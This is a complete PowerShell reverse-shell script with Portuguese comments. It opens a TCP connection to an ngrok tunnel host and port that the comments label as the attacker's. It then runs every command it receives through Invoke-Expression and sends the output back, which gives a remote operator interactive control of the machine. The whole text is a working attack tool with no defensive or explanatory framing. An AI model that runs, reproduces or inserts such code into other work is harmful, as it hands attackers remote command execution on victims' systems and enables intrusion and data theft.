# Configurações
$ip = "0.tcp.sa.ngrok.io"    # Substitua pelo IP do atacante
$port = 14152       # Substitua pela porta usada no Netcat

# Cria conexão com o atacante
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$buffer = New-Object Byte[] 1024
$encoder = New-Object System.Text.ASCIIEncoding

# Função para gerar prompt limpo
function Get-Prompt {
    return "`n$((Get-Location).Path)> "
}

# Loop de comandos
while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
    $command = $encoder.GetString($buffer, 0, $bytesRead).Trim()

    if (-not [string]::IsNullOrWhiteSpace($command)) {
        try {
            $output = Invoke-Expression $command 2>&1 | Out-String
        } catch {
            $output = $_.Exception.Message
        }
    } else {
        $output = ""
    }

    $prompt = Get-Prompt
    $response = $encoder.GetBytes($output + $prompt)
    $stream.Write($response, 0, $response.Length)
    $stream.Flush()
}

# Fecha a conexão
$client.Close()
